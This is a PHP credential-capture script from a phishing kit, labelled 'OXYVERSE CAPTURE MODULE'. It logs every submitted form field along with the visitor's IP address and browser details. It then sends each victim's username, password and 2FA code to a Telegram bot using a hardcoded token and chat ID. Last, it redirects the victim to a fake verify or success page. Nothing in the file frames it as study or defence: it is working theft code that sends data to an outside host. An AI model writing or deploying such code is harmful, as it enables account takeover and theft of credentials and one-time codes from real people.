<?php
// OXYVERSE CAPTURE MODULE
// Professional data collection with logging

// Configuration
$logDir = __DIR__ . '/../logs/';
$telegramToken = '8620097806:AAHJTWoU7nb0IAbE_cpl6_TuS9jYpkRYG7s'; // Optional: add your bot token
$telegramChatId = '8741226322'; // Optional: add your chat ID

// Create log directory if not exists
if (!file_exists($logDir)) {
    mkdir($logDir, 0755, true);
}

// Get victim data
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'direct';

// Capture POST data
$captured = [
    'timestamp' => $timestamp,
    'ip' => $ip,
    'user_agent' => $userAgent,
    'referer' => $referer,
    'data' => $_POST
];

// Format log entry
$logEntry = "=" . str_repeat("=", 60) . "\n";
$logEntry .= "📅 TIME: {$timestamp}\n";
$logEntry .= "🌐 IP: {$ip}\n";
$logEntry .= "🖥️ UA: {$userAgent}\n";
$logEntry .= "🔗 REF: {$referer}\n";
$logEntry .= "📦 DATA:\n";

foreach ($_POST as $key => $value) {
    $logEntry .= "   ├─ {$key}: " . ($value ?: '[empty]') . "\n";
}

$logEntry .= str_repeat("=", 62) . "\n\n";

// Save to file
$dateFile = date('Y-m-d');
$logFile = $logDir . "capture_{$dateFile}.log";
file_put_contents($logFile, $logEntry, FILE_APPEND);

// Also save as JSON for easier parsing
$jsonData = json_encode($captured, JSON_PRETTY_PRINT);
$jsonFile = $logDir . "data_{$dateFile}.json";
$existing = file_exists($jsonFile) ? json_decode(file_get_contents($jsonFile), true) : [];
$existing[] = $captured;
file_put_contents($jsonFile, json_encode($existing, JSON_PRETTY_PRINT));

// Send Telegram notification (if configured)
if ($telegramToken && $telegramChatId) {
    $username = $_POST['username'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $code = $_POST['code'] ?? 'N/A';
    
    $message = "🎯 NEW CAPTURE!\n\n";
    $message .= "👤 Username: {$username}\n";
    $message .= "🔑 Password: {$password}\n";
    $message .= "📱 2FA Code: {$code}\n";
    $message .= "🌐 IP: {$ip}\n";
    $message .= "⏰ Time: {$timestamp}\n";
    $message .= "🖥️ Device: " . substr($userAgent, 0, 100);
    
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $data = ['chat_id' => $telegramChatId, 'text' => $message];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 5
        ]
    ];
    @file_get_contents($url, false, stream_context_create($options));
}

// Redirect based on capture type
$has2fa = isset($_POST['code']) && !empty($_POST['code']);
$redirectPage = $has2fa ? '../success.html' : '../verify.html';

header("Location: {$redirectPage}");
exit();
?>
